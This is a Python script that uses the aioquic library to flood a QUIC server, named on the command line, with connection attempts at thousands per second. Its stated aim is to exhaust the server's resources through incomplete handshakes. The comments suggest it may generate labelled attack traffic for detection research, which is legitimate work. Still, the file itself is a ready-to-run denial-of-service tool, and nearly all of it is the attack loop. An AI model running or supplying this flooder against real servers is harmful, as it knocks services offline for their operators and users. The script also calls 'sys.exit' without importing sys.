#!/usr/bin/env python3
"""
QUIC DoS Traffic Generator - High-Rate Flooding
Uses real QUIC protocol at high rates to overwhelm server
Creates incomplete handshakes through resource exhaustion
"""

import asyncio
import random
import argparse
import logging
import warnings
from aioquic.asyncio.client import connect
from aioquic.h3.connection import H3_ALPN
from aioquic.quic.configuration import QuicConfiguration

warnings.filterwarnings('ignore', category=ResourceWarning)

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger("quic_dos_flooding")
logging.getLogger("quic").setLevel(logging.WARNING)


async def flood_attack(
    server_ip: str,
    server_port: int
):
    """
    Send QUIC connection attempt at high rate
    When rate exceeds server capacity, connections timeout -> S0 state
    This models real DoS attacks through resource exhaustion
    """
    configuration = QuicConfiguration(
        is_client=True,
        alpn_protocols=H3_ALPN,
        verify_mode=False
    )
    
    try:
        async with connect(
            server_ip,
            server_port,
            configuration=configuration,
            wait_connected=False
        ):
            # Very short delay - at high rates, many will timeout
            await asyncio.sleep(0.001)
            
    except Exception:
        pass


async def generate_dos_traffic(
    server_ip: str,
    server_port: int,
    num_attacks: int,
    attack_rate: float,
    duration_seconds: int
):
    """Generate DoS traffic through high-rate flooding"""
    
    logger.info(f"Starting high-rate flooding DoS attack")
    logger.info(f"  Attacks: {num_attacks}")
    logger.info(f"  Rate: {attack_rate}/sec (overwhelming server capacity)")
    logger.info(f"  Duration: {duration_seconds}s")
    logger.info("=" * 70)
    
    start_time = asyncio.get_event_loop().time()
    end_time = start_time + duration_seconds
    attacks_launched = 0
    
    while asyncio.get_event_loop().time() < end_time and attacks_launched < num_attacks:
        asyncio.create_task(flood_attack(server_ip, server_port))
        attacks_launched += 1
        
        if attacks_launched % 500 == 0:
            logger.info(f"Attacks launched: {attacks_launched}/{num_attacks}")
        
        delay = random.expovariate(attack_rate)
        await asyncio.sleep(delay)
    
    logger.info(f"DoS attack complete: {attacks_launched} attacks")
    await asyncio.sleep(5)


async def main():
    parser = argparse.ArgumentParser(
        description="QUIC DoS via High-Rate Flooding (Resource Exhaustion)"
    )
    parser.add_argument("--server", required=True, help="Server IP address")
    parser.add_argument("--port", type=int, default=4433, help="Server port")
    parser.add_argument("--attacks", type=int, default=5000, help="Number of attacks")
    parser.add_argument("--rate", type=float, default=3000.0, help="Attack rate per second")
    parser.add_argument("--duration", type=int, default=1800, help="Duration in seconds")
    
    args = parser.parse_args()
    
    # Set exception handler
    loop = asyncio.get_event_loop()
    
    def exception_handler(loop, context):
        exception = context.get('exception')
        if isinstance(exception, (NotImplementedError, ConnectionError, TimeoutError)):
            return
    
    loop.set_exception_handler(exception_handler)
    
    await generate_dos_traffic(
        server_ip=args.server,
        server_port=args.port,
        num_attacks=args.attacks,
        attack_rate=args.rate,
        duration_seconds=args.duration
    )


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        logger.info("Attack interrupted by user")
    except Exception as e:
        logger.error(f"Error: {e}")
        sys.exit(1)